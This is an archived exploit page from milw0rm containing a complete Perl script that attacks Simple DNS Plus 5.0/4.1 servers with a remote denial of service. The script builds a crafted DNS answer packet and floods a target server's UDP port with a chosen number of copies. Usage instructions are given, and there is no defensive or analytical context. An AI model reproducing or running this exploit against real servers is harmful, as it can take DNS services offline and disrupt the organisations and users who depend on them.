<html><head><title>Simple DNS Plus <= 5.0/4.1 Remote Denial of Service Exploit</title></head><pre>#!/usr/bin/perl
# Simple DNS Plus 5.0/4.1 &lt; remote Denial of Service exploit
#
# usage: sdns-dos.pl &lt;dns server&gt; &lt;dns source port&gt; &lt;num of packets&gt;
# Exploit written by Exodus.
# http://www.blackhat.org.il
 
use IO::Socket;
 
if(@ARGV &lt; 3){
print(&quot;sdns-dos.pl &lt;dns server&gt; &lt;dns source port&gt; &lt;num of packets&gt;&quot;);
}
$sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; &quot;$ARGV[0]:$ARGV[1]&quot;, Proto =&gt; 'UDP') || die(&quot;Cant connect DNS server&quot;);
 
 
 
$address = $ARGV[0];
 
$trans = pack(&quot;H4&quot;,&quot;1337&quot;);
$flags = pack(&quot;B16&quot;,&quot;1000010110110000&quot;);
$question = pack(&quot;H4&quot;,&quot;0001&quot;);
$answerRR = pack(&quot;H4&quot;,&quot;0001&quot;);
$authorityRR = pack(&quot;H4&quot;,&quot;0000&quot;);
$additionlRR = pack(&quot;H4&quot;,&quot;0000&quot;);
$type = pack(&quot;H4&quot;,&quot;0001&quot;); # A host name
$class = pack(&quot;H4&quot;,&quot;0001&quot;); # IN
 
@parts = split(/\./,$address);
foreach $part (@parts)
{
 $packedlen = pack(&quot;H2&quot;,sprintf(&quot;%02x&quot;,length($part)));
 $address2 .= $packedlen.$part;
}
$query = $address2. &quot;\000&quot; . $type . $class;
 
$aname = pack(&quot;H4&quot;,&quot;c00c&quot;);
$atype = pack(&quot;H4&quot;,&quot;0001&quot;);
$aclass = pack(&quot;H4&quot;,&quot;0001&quot;);
$ttl = pack(&quot;H8&quot;,&quot;0000008d&quot;);
$dlen = pack(&quot;H4&quot;,&quot;0004&quot;);
$addr = inet_aton(&quot;127.0.0.1&quot;);
$answer = $aname . $atype . $aclass . $ttl . $dlen . $addr;
 
$payload = $trans . $flags . $question . $answerRR
. $authorityRR . $additionlRR . $query . $answer;
 
print &quot;sending $ARGV[2] packetsâ€¦ &quot;;
for($i=0;$i&lt;=$ARGV[2];$i++)
{
 print $sock $payload;
}
print &quot;Done. Good bye.&quot;;
__END__ 

# milw0rm.com [2008-07-13]</pre></html>